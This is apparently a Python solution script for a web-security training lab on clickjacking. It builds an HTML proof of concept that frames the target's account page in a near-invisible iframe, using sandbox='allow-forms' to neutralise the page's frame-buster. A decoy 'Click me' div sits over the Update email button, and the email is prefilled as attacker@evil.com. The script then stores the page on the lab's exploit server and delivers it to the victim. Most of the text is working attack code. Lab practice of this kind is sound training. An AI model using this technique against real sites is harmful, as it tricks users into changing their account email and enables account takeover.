import argparse
import requests

# Clickjacking labs, like the CSRF labs, are exploited by hosting an HTML page on
# the exploit server and delivering it to the victim. Python cannot BE the victim
# browser that clicks the decoy, but it can drive the exploit server's store +
# deliver API (what the "Deliver to victim" button does): upload the PoC and
# deliver it. Align the decoy in the exploit-server preview before delivering.

parser = argparse.ArgumentParser(description="Solve Clickjacking lab 3 (frame buster script)")
parser.add_argument("exploit_server", help="Exploit server URL (https://exploit-...exploit-server.net)")
parser.add_argument("lab_url", help="Lab URL (https://0a...web-security-academy.net)")
parser.add_argument("--email", default="attacker@evil.com", help="Email to prefill on the victim account")
parser.add_argument("--top", default="480px", help="Decoy 'top' offset over the Update email button")
parser.add_argument("--left", default="80px", help="Decoy 'left' offset over the Update email button")
args = parser.parse_args()

exploit_server = args.exploit_server.rstrip("/")
lab_url = args.lab_url.rstrip("/")

# The sandbox attribute is a whitelist: allow-forms lets the change-email form
# submit, while allow-top-navigation is OMITTED - so the page's frame-buster
# script can run but can't redirect the browser out of our frame. The email is
# prefilled via the ?email= query parameter so one victim click submits it.
poc = f"""<html>
  <head>
    <style>
      iframe {{ position: relative; width: 500px; height: 700px; opacity: 0.0001; z-index: 2; }}
      div    {{ position: absolute; top: {args.top}; left: {args.left}; z-index: 1; }}
    </style>
  </head>
  <body>
    <div>Click me</div>
    <iframe sandbox="allow-forms" src="{lab_url}/my-account?email={args.email}"></iframe>
  </body>
</html>"""

# the exploit server accepts a form post to store and/or deliver the response.
def exploit_action(form_action):
    return requests.post(exploit_server + "/", data={
        "urlIsHttps": "true",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": poc,
        "formAction": form_action,
    })

print("[*] Storing the clickjacking PoC on the exploit server...")
exploit_action("STORE")

print("[*] Delivering the exploit to the victim...")
exploit_action("DELIVER_TO_VICTIM")

# check whether the lab is now solved
status = requests.get(lab_url + "/").text
if "is-solved" in status or "Congratulations" in status:
    print("[+] Lab solved!")
else:
    print("[!] Delivered. Make sure the decoy was aligned over the button, then re-check in a moment.")
